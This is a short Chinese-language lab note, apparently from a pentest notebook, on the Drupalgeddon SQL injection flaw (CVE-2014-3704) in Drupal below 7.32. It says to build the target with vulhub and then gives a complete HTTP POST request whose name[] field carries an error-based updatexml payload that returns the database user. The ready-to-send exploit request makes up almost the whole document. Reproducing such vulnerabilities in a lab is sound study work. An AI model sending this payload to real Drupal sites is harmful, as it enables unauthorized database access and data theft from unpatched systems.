# Drupal漏洞

## Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）

1. 环境搭建使用vulhub
2. 发送如下数据包即可在返回值中取得数据

```txt
POST /?q=node&destination=node HTTP/1.1
Host: 192.168.3.148:10000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 122

pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a

```
